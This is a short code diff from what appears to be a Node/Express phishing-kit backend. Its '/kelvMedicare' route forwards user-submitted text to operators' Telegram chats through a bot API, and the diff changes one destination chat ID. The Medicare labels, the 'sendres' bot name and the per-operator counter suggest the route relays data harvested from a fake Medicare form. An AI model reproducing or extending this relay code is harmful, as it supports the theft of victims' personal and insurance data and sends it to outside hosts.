@@ -1180,7 +1180,7 @@ app.post("/kelvMedicare", (req, res) => {
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareKelv:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-1248378980&text=Medicare:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-757683438&text=Medicare:\n${originalText}`
         );
         kelvCount += 1;
       }
